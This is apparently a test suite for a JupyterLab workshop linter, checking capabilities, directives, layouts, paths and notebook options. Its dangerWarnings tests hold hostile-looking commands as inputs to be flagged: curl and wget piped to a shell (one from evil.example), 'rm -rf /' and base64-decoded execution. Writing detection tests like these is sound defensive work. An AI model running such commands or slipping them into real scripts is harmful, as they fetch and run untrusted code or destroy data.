import { parseManifest } from '../format/manifest';
import { parsePage } from '../format/page';
import { dangerWarnings, mentionsAbsolutePath } from '../lint/danger';
import { lintWorkshop } from '../lint/rules';
import { formatLintMessage } from '../lint/types';

const MANIFEST = `
apiVersion: jupyterlab-workshop/v1alpha1
name: demo
title: Demo
capabilities:
  - terminal
  - write-files
pages: [pages/01.md]
`;

function lint(page: string, manifest = MANIFEST) {
  return lintWorkshop({
    manifest: parseManifest(manifest),
    pages: [parsePage(page, { path: 'pages/01.md', variables: {} })]
  });
}

function rules(page: string, manifest = MANIFEST): string[] {
  return lint(page, manifest).map(message => message.rule);
}

describe('dangerWarnings', () => {
  it('flags the usual suspects', () => {
    const rulesFor = (text: string) => dangerWarnings(text).map(w => w.rule);

    expect(rulesFor('curl -fsSL https://x/y.sh | sh')).toContain(
      'danger-pipe-to-shell'
    );
    expect(rulesFor('wget -qO- https://x/y.sh | sudo bash')).toContain(
      'danger-pipe-to-shell'
    );
    expect(rulesFor('sudo apt install git')).toContain('danger-sudo');
    expect(rulesFor('rm -rf /')).toContain('danger-recursive-delete');
    expect(rulesFor('rm -rf ~/stuff')).toContain('danger-recursive-delete');
    expect(rulesFor('rm -rf demo')).not.toContain('danger-recursive-delete');
    expect(rulesFor('eval "$(ssh-agent)"')).toContain('danger-eval');
    expect(rulesFor('echo aGk= | base64 -d | sh')).toContain(
      'danger-base64-exec'
    );
    expect(rulesFor('ls ~/Downloads')).toContain('danger-home-path');
    expect(rulesFor('git status')).toEqual([]);
  });

  it('finds absolute paths', () => {
    expect(mentionsAbsolutePath('cat /etc/hosts')).toBe(true);
    expect(mentionsAbsolutePath('cat etc/hosts')).toBe(false);
  });
});

describe('lintWorkshop', () => {
  it('passes a clean workshop', () => {
    expect(
      lint(`---
title: One
---

\`\`\`{execute}
git status
\`\`\`

\`\`\`{file-write}
:path: notes.txt
hello
\`\`\`
`)
    ).toEqual([]);
  });

  it('reports unknown directives, options and missing bodies', () => {
    const found = rules(`---
title: One
---

\`\`\`{teleport}
\`\`\`

\`\`\`{execute}
:colour: red
git status
\`\`\`

\`\`\`{execute}
\`\`\`
`);

    expect(found).toEqual([
      'unknown-directive',
      'unknown-option',
      'missing-body',
      'unused-capability'
    ]);
  });

  it('reports undeclared and unused capabilities', () => {
    const messages = lint(
      `---
title: One
---

\`\`\`{kernel-execute}
:auto: page-enter
print(1)
\`\`\`
`,
      MANIFEST
    );

    expect(messages.map(message => [message.level, message.rule])).toEqual([
      ['error', 'undeclared-capability'],
      ['error', 'undeclared-capability'],
      ['warning', 'unused-capability'],
      ['warning', 'unused-capability']
    ]);
    expect(messages[0].message).toContain('"kernel-exec"');
    expect(messages[1].message).toContain('"auto-run"');
    expect(formatLintMessage(messages[0])).toBe(
      `workshop.yaml: error: ${messages[0].message}`
    );
  });

  it('warns about dangerous commands and paths', () => {
    const found = rules(`---
title: One
---

\`\`\`{execute}
curl https://evil.example/x.sh | sh
\`\`\`

\`\`\`{execute}
git clone https://github.com/o/r
\`\`\`

\`\`\`{file-write}
:path: /tmp/notes.txt
hello
\`\`\`

\`\`\`{file-write}
:path: ../notes.txt
hello
\`\`\`

\`\`\`{file-rename}
:path: notes.txt
:to: /tmp/notes.txt
\`\`\`
`);

    // The write to ../notes.txt lands inside the workshop but outside
    // the workspace, which is refused rather than merely warned about.
    expect(found).toEqual([
      'danger-pipe-to-shell',
      'path-outside-workspace',
      'write-refused',
      'path-outside-workspace'
    ]);
  });

  it('refuses a file-delete of the workshop or its state', () => {
    const found = rules(`
\`\`\`{execute}
ls
\`\`\`

\`\`\`{file-delete}
:path: .
\`\`\`

\`\`\`{file-delete}
:path: _workshop/state.json
\`\`\`

\`\`\`{file-delete}
:path: scratch
:recursive: true
:missing: maybe
\`\`\`

\`\`\`{file-delete}
:path: scratch/notes.md
\`\`\`
`);

    expect(found).toEqual([
      'invalid-file-delete',
      'invalid-file-delete',
      'invalid-file-delete'
    ]);
  });

  it('checks chain targets exist', () => {
    const messages = lint(
      `---
title: One
---

\`\`\`{execute}
:cascade: nowhere after 1s
git status
\`\`\`

\`\`\`{execute}
:auto: after:missing
git status
\`\`\`

\`\`\`{execute}
:auto: sometimes
git status
\`\`\`

\`\`\`{verify}
:substrate: contents
:trigger: after:nothing; after:missing-too; terminal-output "ok"
exists README.md
\`\`\`
`,
      MANIFEST.replace('- terminal', '- terminal\n  - auto-run')
    );

    expect(messages.map(message => message.rule)).toEqual([
      'unused-capability',
      'unknown-action-id',
      'unknown-action-id',
      'unknown-auto',
      'unknown-action-id',
      'unknown-action-id'
    ]);
    expect(messages[1].line).toBe(5);
    expect(messages[4].message).toBe(
      '"01-4" is triggered by unknown action "nothing"'
    );
  });

  it('accepts a verify triggered by an action on another page', () => {
    const messages = lintWorkshop({
      manifest: parseManifest(
        MANIFEST.replace('[pages/01.md]', '[pages/01.md, pages/02.md]')
      ),
      pages: [
        parsePage(
          `---
title: One
---

\`\`\`{execute}
:id: setup
git status
\`\`\`
`,
          { path: 'pages/01.md', variables: {} }
        ),
        parsePage(
          `---
title: Two
---

\`\`\`{verify}
:substrate: contents
:trigger: after:setup
exists README.md
\`\`\`
`,
          { path: 'pages/02.md', variables: {} }
        )
      ]
    });

    expect(messages.map(message => message.rule)).not.toContain(
      'unknown-action-id'
    );
  });
});

describe('lintWorkshop checks', () => {
  const CHECKS_MANIFEST = MANIFEST.replace(
    '- terminal',
    '- terminal\n  - kernel-exec'
  );

  function lintPages(pages: Record<string, string>) {
    const manifest = parseManifest(
      CHECKS_MANIFEST.replace(
        'pages: [pages/01.md]',
        `pages: [${Object.keys(pages).join(', ')}]`
      )
    );

    return lintWorkshop({
      manifest,
      pages: Object.entries(pages).map(([path, source]) =>
        parsePage(source, { path, variables: {} })
      )
    }).filter(message => message.level === 'error');
  }

  it('validates verify, quiz and form directives', () => {
    const messages = lintPages({
      'pages/01.md': `---
title: One
---

\`\`\`{verify}
:id: ok
:substrate: contents
exists demo
\`\`\`

\`\`\`{verify}
:id: bad
:trigger: teleport
:substrate: ui
nope
\`\`\`

\`\`\`{quiz}
:id: q
question: x
options: [a]
\`\`\`

\`\`\`{form}
:id: f
- { name: a, type: select }
\`\`\`
`
    });

    expect(messages.map(message => message.rule)).toEqual([
      'invalid-verify',
      'invalid-verify',
      'invalid-quiz',
      'invalid-form'
    ]);
    expect(messages[0].message).toContain('Unknown trigger "teleport"');
    expect(messages[1].message).toContain('Unknown predicate "nope"');
  });

  it('checks requirements name existing checks', () => {
    const messages = lintPages({
      'pages/01.md': `---
title: One
requires: [verify:done, quiz:done, nonsense]
---

\`\`\`{verify}
:id: done
:substrate: contents
exists demo
\`\`\`
`
    });

    expect(messages.map(message => [message.rule, message.message])).toEqual([
      [
        'unknown-requirement',
        'Requirement "quiz:done" names no quiz directive'
      ],
      [
        'invalid-requirement',
        'Requirement "nonsense" should look like verify:<id>, quiz:<id> or form:<id>'
      ]
    ]);
  });

  it('flags variables used before the form that sets them', () => {
    const messages = lintPages({
      'pages/01.md': `---
title: One
---

\`\`\`{execute}
git config user.name "{{ user_name }}"
\`\`\`
`,
      'pages/02.md': `---
title: Two
---

\`\`\`{form}
:id: setup
- { name: user_name }
\`\`\`

\`\`\`{execute}
echo {{ user_name }}
\`\`\`
`
    });

    expect(messages.map(message => [message.rule, message.path])).toEqual([
      ['use-before-form', 'pages/01.md']
    ]);
  });

  it('checks platform variants against the declared platforms', () => {
    const manifest = MANIFEST.replace(
      'pages:',
      'platforms: [linux, windows]\nfrontends: [jupyterlab, jupyterlite]\npages:'
    );
    const page = (body: string) => `\`\`\`{execute}\n${body}\n\`\`\`\n`;

    expect(rules(page('ls\n:windows:\ndir'), manifest)).toEqual([
      'unused-capability'
    ]);
    expect(rules(page(':windows:\ndir\n:jupyterlite:'), manifest)).toEqual([
      'missing-variant',
      'unused-capability'
    ]);
    expect(rules(page(':windows:\ndir'), MANIFEST)).toEqual([
      'unused-capability'
    ]);

    // A frontend variant covers its frontend on every platform, so a
    // body with one for each listed frontend needs no platform variant.
    expect(
      rules(page(':jupyterlab:\nls\n:jupyterlite:\nls -1'), manifest)
    ).toEqual(['unused-capability']);

    // Without platforms listed, the listed frontends must each be covered.
    const frontendsOnly = MANIFEST.replace(
      'pages:',
      'frontends: [jupyterlab, jupyterlite]\npages:'
    );

    expect(rules(page(':jupyterlab:\nls'), frontendsOnly)).toEqual([
      'missing-variant',
      'unused-capability'
    ]);
  });

  it('refuses the old lite platform with a pointer to frontends', () => {
    expect(() =>
      parseManifest(
        MANIFEST.replace('pages:', 'platforms: [linux, lite]\npages:')
      )
    ).toThrow(/frontends: \[jupyterlab, jupyterlite\]/);
  });

  it('warns about what JupyterLite cannot run', () => {
    const manifest = MANIFEST.replace(
      'pages:',
      'platforms: [linux]\nfrontends: [jupyterlab, jupyterlite]\npages:'
    ).replace('  - terminal\n', '  - terminal\n  - kernel-exec\n');
    const execute = (body: string) => `\`\`\`{execute}\n${body}\n\`\`\`\n`;
    const verify = (options: string, body: string) =>
      `\`\`\`{verify}\n${options}\n${body}\n\`\`\`\n`;

    // Syntax cockle lacks is reported unless a Lite variant replaces it.
    expect(rules(execute('mkdir x && cd x'), manifest)).toContain(
      'lite-shell-syntax'
    );
    expect(
      rules(execute('mkdir x && cd x\n:jupyterlite:\nmkdir x'), manifest)
    ).not.toContain('lite-shell-syntax');
    expect(
      rules(execute('mkdir x && cd x\n:jupyterlite:'), manifest)
    ).not.toContain('lite-shell-syntax');

    // A condition that excludes the frontend is evaluated, not pattern
    // matched, so any spelling of the exclusion counts and a condition
    // about something else does not.
    expect(
      rules(
        execute(':when: frontend != "jupyterlite"\nmkdir x && cd x'),
        manifest
      )
    ).not.toContain('lite-shell-syntax');
    expect(
      rules(
        execute(':when: not (frontend == "jupyterlite")\nmkdir x && cd x'),
        manifest
      )
    ).not.toContain('lite-shell-syntax');
    expect(
      rules(execute(':when: track == "pip"\nmkdir x && cd x'), manifest)
    ).toContain('lite-shell-syntax');

    // Server-only substrates and processes are flagged too.
    expect(rules(verify(':script: check.py', ''), manifest)).toContain(
      'lite-unsupported'
    );
    expect(
      rules(verify(':substrate: shell', 'test -f x || false'), manifest)
    ).toContain('lite-shell-syntax');
    expect(
      rules(verify('', 'import subprocess\nsubprocess.run(["ls"])'), manifest)
    ).toContain('lite-unsupported');
    expect(rules(verify('', 'assert True'), manifest)).not.toContain(
      'lite-unsupported'
    );

    // Nothing is checked for JupyterLite when the manifest does not list it.
    expect(rules(execute('mkdir x && cd x'), MANIFEST)).not.toContain(
      'lite-shell-syntax'
    );
  });

  it('warns about tools that are never looked for', () => {
    const withTools = (tools: string, lists = '') =>
      MANIFEST.replace(
        'pages:',
        `${lists}requires:\n  tools:\n${tools}\npages:`
      );

    // Every platform, JupyterLab only, unless the manifest says otherwise.
    expect(
      rules('# x\n', withTools('    - { name: py, platforms: [windows] }'))
    ).not.toContain('unreachable-tool');
    expect(
      rules('# x\n', withTools('    - { name: git, frontends: [jupyterlite] }'))
    ).toContain('unreachable-tool');
    expect(
      rules(
        '# x\n',
        withTools(
          '    - { name: py, platforms: [windows] }',
          'platforms: [linux, macos]\n'
        )
      )
    ).toContain('unreachable-tool');

    // Under JupyterLite the platform is emscripten, so a platform list
    // never matches there; the tool is still reachable through JupyterLab.
    expect(
      rules(
        '# x\n',
        withTools(
          '    - { name: git, platforms: [linux] }',
          'platforms: [linux]\nfrontends: [jupyterlab, jupyterlite]\n'
        )
      )
    ).not.toContain('unreachable-tool');
    expect(
      rules(
        '# x\n',
        withTools(
          '    - { name: git, platforms: [linux], frontends: [jupyterlite] }',
          'platforms: [linux]\nfrontends: [jupyterlab, jupyterlite]\n'
        )
      )
    ).toContain('unreachable-tool');
  });

  it('warns about names tested against missing_tools that no tool declares', () => {
    const manifest = MANIFEST.replace(
      'pages:',
      'requires:\n  tools:\n    - { name: git }\npages:'
    );
    const when = (condition: string) =>
      `\`\`\`{when} ${condition}\nInstall it.\n\`\`\`\n`;

    expect(rules(when('"git" in missing_tools'), manifest)).not.toContain(
      'unknown-tool'
    );
    expect(rules(when('"gti" in missing_tools'), manifest)).toContain(
      'unknown-tool'
    );
    expect(rules(when('"curl" not in missing_tools'), manifest)).toContain(
      'unknown-tool'
    );

    // The rule looks at the front matter, at nested blocks and at the
    // when option of a directive, and only at tests against missing_tools.
    expect(
      rules(`---\nwhen: '"curl" in missing_tools'\n---\n# x\n`, manifest)
    ).toContain('unknown-tool');
    expect(
      rules(
        when(`platform == "linux"\n\n${when('"curl" in missing_tools')}`),
        manifest
      )
    ).toContain('unknown-tool');
    expect(
      rules(
        '\`\`\`{execute}\n:when: "curl" in missing_tools\nbrew install curl\n\`\`\`\n',
        manifest
      )
    ).toContain('unknown-tool');
    expect(rules(when('"curl" in ["curl", "wget"]'), manifest)).not.toContain(
      'unknown-tool'
    );
  });

  it('warns about actions a listed frontend cannot run', () => {
    const manifest = MANIFEST.replace(
      'pages:',
      'frontends: [jupyterlab, jupyterlite]\nenvironment: { requirements: requirements.txt }\npages:'
    ).replace('  - terminal\n', '  - terminal\n  - install-packages\n');
    const create = (options = '') =>
      `\`\`\`{environment-create}\n${options}\n\`\`\`\n`;

    expect(rules(create(), manifest)).toContain('unsupported-frontend');
    expect(
      rules(create(':when: frontend == "jupyterlab"'), manifest)
    ).not.toContain('unsupported-frontend');
    expect(rules(create(), MANIFEST)).not.toContain('unsupported-frontend');
  });

  it('requires install-packages for an environment', () => {
    const manifest = MANIFEST.replace(
      'pages:',
      'environment: { requirements: requirements.txt }\npages:'
    );

    expect(rules('# Nothing\n', manifest)).toEqual([
      'undeclared-capability',
      'unused-capability',
      'unused-capability'
    ]);
    expect(
      rules(
        '# Nothing\n',
        manifest.replace('  - terminal', '  - install-packages')
      )
    ).toEqual(['unused-capability']);
  });
});

describe('layout rules', () => {
  const withLayouts = (layouts: string) =>
    `${MANIFEST}layout: custom\nlayouts:\n${layouts}`;

  it('accepts declared and built-in layouts', () => {
    expect(
      rules(
        '```{layout}\n:name: terminal-only\n```\n',
        withLayouts(
          '  custom:\n    sidebar: hidden\n    instructions: { width: 0.2 }\n    main:\n      areas:\n        - { name: docs, tabs: ["markdown:README.md"] }\n        - size: 0.3\n          split: columns\n          areas:\n            - { tabs: ["terminal:git"] }\n            - { tabs: [] }\n'
        )
      ).filter(rule => rule.includes('layout'))
    ).toEqual([]);
  });

  it('reports layouts that are neither declared nor built in', () => {
    const findings = lint(
      '```{layout}\n:name: missing\n```\n',
      `${MANIFEST}layout: nowhere\n`
    ).filter(message => message.rule === 'unknown-layout');

    expect(findings.map(message => message.message)).toEqual([
      expect.stringContaining('"nowhere"'),
      expect.stringContaining('"missing"')
    ]);
    expect(findings[1].path).toBe('pages/01.md');
  });

  it('reports widget references of unknown kind or without a path', () => {
    const findings = rules(
      'text',
      withLayouts(
        '  custom:\n    main:\n      tabs: ["window:x", "markdown", "launcher", "editor"]\n'
      )
    );

    expect(
      findings.filter(rule => rule === 'unknown-layout-widget')
    ).toHaveLength(3);
  });

  it('reports areas that are neither tabs nor a split, or both', () => {
    const findings = lint(
      'text',
      withLayouts(
        '  custom:\n    main:\n      areas:\n        - { name: a }\n        - { tabs: ["terminal:x"], areas: [{ tabs: [] }] }\n'
      )
    ).filter(message => message.rule === 'layout-area');

    expect(findings.map(message => message.message)).toEqual([
      expect.stringContaining('neither "tabs" nor "areas"'),
      expect.stringContaining('both "tabs" and "areas"')
    ]);
  });

  it('reports duplicate area names and more than one placeholder', () => {
    const findings = lint(
      'text',
      withLayouts(
        '  custom:\n    main:\n      areas:\n        - { name: a, tabs: [] }\n        - { name: a, tabs: [] }\n  other:\n    main:\n      tabs: []\n      name: a\n'
      )
    ).filter(message => message.rule === 'layout-area');

    expect(findings.map(message => message.message)).toEqual([
      expect.stringContaining('names two areas "a"'),
      expect.stringContaining('2 empty "tabs" areas')
    ]);
  });

  it('checks the area option of opening actions against the layouts', () => {
    const manifest = withLayouts(
      '  custom:\n    main:\n      areas:\n        - { name: code, tabs: [] }\n        - { tabs: ["terminal:shell"] }\n'
    );

    expect(
      rules(
        '```{file-open}\n:path: a.py\n:area: code\n```\n\n```{terminal-open}\n:session: x\n:area: bottom\n```\n\n```{notebook-open}\n:path: a.ipynb\n:area: {{ where }}\n```\n',
        manifest
      ).filter(rule => rule === 'unknown-layout-area')
    ).toEqual([]);

    const findings = lint(
      '```{file-open}\n:path: a.py\n:area: shells\n```\n',
      manifest
    ).filter(message => message.rule === 'unknown-layout-area');

    expect(findings).toHaveLength(1);
    expect(findings[0].message).toContain('"shells"');
    expect(findings[0].path).toBe('pages/01.md');
  });
});

describe('editor action options', () => {
  it('reports targeting problems as invalid-<directive>', () => {
    const found = rules(`
\`\`\`{editor-select}
:path: a.py
\`\`\`

\`\`\`{editor-highlight}
:path: a.py
:match: (def
:regex: true
\`\`\`

\`\`\`{editor-replace}
:path: a.py
:match: x
:expand: true
new
\`\`\`

\`\`\`{editor-insert}
:path: a.py
:line: 2-3
new
\`\`\`

\`\`\`{editor-replace}
:path: a.py
:line: 2-3
:expand: true
\`\`\`
`);

    expect(found).toEqual([
      'invalid-editor-select',
      'invalid-editor-highlight',
      'invalid-editor-replace',
      'invalid-editor-insert',
      'invalid-editor-replace',
      'unused-capability'
    ]);
  });

  it('accepts the targeting options when they agree', () => {
    const found = rules(`
\`\`\`{editor-select}
:path: a.py
:match: def (\\w+)
:regex: true
:occurrence: 2-3
:group: 1
\`\`\`

\`\`\`{editor-replace}
:path: a.py
:match: ^def (\\w+)
:regex: true
:occurrence: all
:expand: true
def renamed_$1
\`\`\`

\`\`\`{editor-replace}
:path: a.py
:line: 10-15
\`\`\`

\`\`\`{editor-insert}
:path: a.py
:match: ^import
:regex: true
:position: after
import sys
\`\`\`
`);

    expect(found.filter(rule => rule.startsWith('invalid-'))).toEqual([]);
  });
});

describe('manifest links', () => {
  // The manifest declares two capabilities, so the page uses both.
  const PAGE = `---
title: One
---

\`\`\`{execute}
git status
\`\`\`

\`\`\`{file-write}
:path: notes.txt
hello
\`\`\`
`;

  it('accepts http and https links', () => {
    expect(
      rules(
        PAGE,
        `${MANIFEST}homepage: https://example.org/w\nissues: http://example.org/w/issues\n`
      )
    ).toEqual([]);
  });

  it('rejects anything that is not a web URL', () => {
    const found = lint(
      PAGE,
      `${MANIFEST}homepage: example.org/w\nissues: "mailto:me@example.org"\n`
    );

    expect(found.map(message => message.rule)).toEqual([
      'invalid-link',
      'invalid-link'
    ]);
    expect(found[0].level).toBe('error');
    expect(found[0].path).toBe('workshop.yaml');
    expect(found[0].message).toContain('"homepage"');
    expect(found[1].message).toContain('"issues"');
  });
});

describe('environment-create', () => {
  it('accepts the force option', () => {
    const found = rules(
      `---
title: One
---

\`\`\`{environment-create}
:force: true
\`\`\`
`,
      `${MANIFEST}environment:\n  requirements: requirements.txt\n`
    );

    expect(found).not.toContain('unknown-option');
  });
});

describe('paths from a workspace', () => {
  const page = (path: string): string => `---
title: One
---

\`\`\`{execute}
git status
\`\`\`

\`\`\`{file-write}
:path: ${path}
hello
\`\`\`
`;

  it('flags a path that climbs out of the workshop', () => {
    expect(rules(page('notes.txt'))).toEqual([]);
    expect(rules(page('../../notes.txt'))).toContain('path-outside-workspace');
    expect(rules(page('../README.md'))).not.toContain('path-outside-workspace');
  });
});

describe('refused writes', () => {
  const page = (path: string): string => `---
title: One
---

\`\`\`{execute}
git status
\`\`\`

\`\`\`{file-write}
:path: ${path}
hello
\`\`\`
`;

  it("reports writes to the workshop's own files and outside the workspace", () => {
    expect(rules(page('../pages/01.md'))).toContain('write-refused');
    expect(rules(page('../workshop.yaml'))).toContain('write-refused');
    expect(rules(page('../notes.txt'))).toContain('write-refused');
    expect(rules(page('notes.txt'))).not.toContain('write-refused');
    expect(rules(page('pages/01.md'))).not.toContain('write-refused');
    expect(rules(page('../scratch/notes.txt'))).toContain('write-refused');
  });
});

const NOTEBOOK_MANIFEST = `
apiVersion: jupyterlab-workshop/v1alpha1
name: demo
title: Demo
capabilities:
  - write-files
  - kernel-exec
  - auto-run
pages: [pages/01.md, pages/02.md]
`;

describe('notebook-create', () => {
  const create = (options: string) =>
    `\`\`\`{notebook-create}\n:id: create\n:path: work.ipynb\n${options}- code: x = 1\n\`\`\`\n`;

  it('warns when one that replaces the notebook runs on its own', () => {
    // Entering the page again would put the starting notebook back over
    // the learner's work, which keeping an existing one avoids.
    expect(rules(create(':auto: page-enter\n'), NOTEBOOK_MANIFEST)).toContain(
      'notebook-overwrite'
    );
    expect(
      rules(create(':auto: page-enter\n:existing: keep\n'), NOTEBOOK_MANIFEST)
    ).not.toContain('notebook-overwrite');

    // Clicked, replacing is the learner's own doing.
    expect(rules(create(''), NOTEBOOK_MANIFEST)).not.toContain(
      'notebook-overwrite'
    );
  });

  it('accepts keep and replace for existing and nothing else', () => {
    const found = lint(create(':existing: sometimes\n'), NOTEBOOK_MANIFEST);

    expect(found.map(message => message.rule)).toContain(
      'invalid-notebook-create'
    );
    expect(
      rules(create(':existing: replace\n'), NOTEBOOK_MANIFEST).filter(
        rule => rule === 'invalid-notebook-create' || rule === 'unknown-option'
      )
    ).toEqual([]);
  });
});

describe('a layout that opens a terminal', () => {
  const page = '```{cell-run}\n:path: work.ipynb\n:cell: one\n```\n';

  it('is reported when the manifest declares no terminal capability', () => {
    // The built-in layouts both open one, which is what a notebook
    // workshop given "layout: default" ends up showing.
    const found = lint(page, `${NOTEBOOK_MANIFEST}layout: default\n`).filter(
      message => message.rule === 'layout-terminal'
    );

    expect(found).toHaveLength(1);
    expect(found[0].level).toBe('warning');
    expect(found[0].message).toContain('"default"');

    // A layout a page applies counts as well, once however often it is
    // named; one that is only declared does not.
    const declared = `${NOTEBOOK_MANIFEST}layouts:\n  shell:\n    main: { tabs: ["terminal:demo"] }\n`;

    expect(rules(page, declared)).not.toContain('layout-terminal');
    expect(
      rules(
        `${page}\`\`\`{layout}\n:name: shell\n\`\`\`\n\`\`\`{layout}\n:name: shell\n\`\`\`\n`,
        declared
      ).filter(rule => rule === 'layout-terminal')
    ).toHaveLength(1);
  });

  it('is fine with the capability, or with no terminal in the layout', () => {
    expect(rules('', `${MANIFEST}layout: default\n`)).not.toContain(
      'layout-terminal'
    );
    expect(
      rules(
        page,
        `${NOTEBOOK_MANIFEST}layout: plain\nlayouts:\n  plain:\n    main: { tabs: [] }\n`
      )
    ).not.toContain('layout-terminal');
  });
});

describe('resumable', () => {
  const lintPages = (manifest: string, pages: string[]) =>
    lintWorkshop({
      manifest: parseManifest(manifest),
      pages: pages.map((page, index) =>
        parsePage(page, { path: `pages/0${index + 1}.md`, variables: {} })
      )
    }).map(message => message.rule);

  const define =
    '```{cell-insert}\n:path: work.ipynb\n:tags: [one]\n:run: true\ntimer = 1\n```\n';
  const use =
    '```{verify}\n:substrate: learner-kernel\n:path: work.ipynb\ntimer == 1\n```\n';

  it('is questioned when pages share the kernel of one notebook', () => {
    // What the first page defined is gone after a restart, so the second
    // cannot be continued into.
    expect(
      lintPages(`${NOTEBOOK_MANIFEST}resumable: true\n`, [define, use])
    ).toContain('resumable-kernel-state');
  });

  it('is left alone otherwise', () => {
    // Not resumable, all on one page, or cells that are only inserted.
    expect(lintPages(NOTEBOOK_MANIFEST, [define, use])).not.toContain(
      'resumable-kernel-state'
    );
    expect(
      lintPages(`${NOTEBOOK_MANIFEST}resumable: true\n`, [define + use, ''])
    ).not.toContain('resumable-kernel-state');
    expect(
      lintPages(`${NOTEBOOK_MANIFEST}resumable: true\n`, [
        define.replace(':run: true\n', ''),
        define.replace(':run: true\n', '')
      ])
    ).not.toContain('resumable-kernel-state');
  });
});

describe('url-open', () => {
  it('accepts a web URL, a variable URL and a pane', () => {
    expect(
      rules(
        '```{url-open}\n:url: https://example.com/docs/\n:pane: docs\n```\n\n```{url-open}\n:url: {{ app_url }}\n```\n'
      ).filter(rule => rule.includes('url'))
    ).toEqual([]);
  });

  it('reports a missing or non-web URL', () => {
    const missing = lint('```{url-open}\n:pane: docs\n```\n').filter(
      message => message.rule === 'invalid-url-open'
    );

    expect(missing).toHaveLength(1);
    expect(missing[0].message).toContain('"url" option');

    const bad = lint('```{url-open}\n:url: ftp://example.com/\n```\n').filter(
      message => message.rule === 'invalid-url-open'
    );

    expect(bad).toHaveLength(1);
    expect(bad[0].message).toContain('ftp://example.com/');
  });

  it('warns about an http URL', () => {
    const findings = lint(
      '```{url-open}\n:url: http://localhost:8000/\n:pane: app\n```\n'
    ).filter(message => message.rule === 'insecure-url');

    expect(findings).toHaveLength(1);
    expect(findings[0].level).toBe('warning');
  });

  it('warns about an automatic run with no pane', () => {
    expect(
      rules(
        '```{url-open}\n:id: docs\n:url: https://example.com/\n:auto: true\n```\n'
      )
    ).toContain('auto-new-tab');
    expect(
      rules(
        '```{url-open}\n:id: docs\n:url: https://example.com/\n:pane: docs\n:auto: true\n```\n'
      )
    ).not.toContain('auto-new-tab');
  });
});
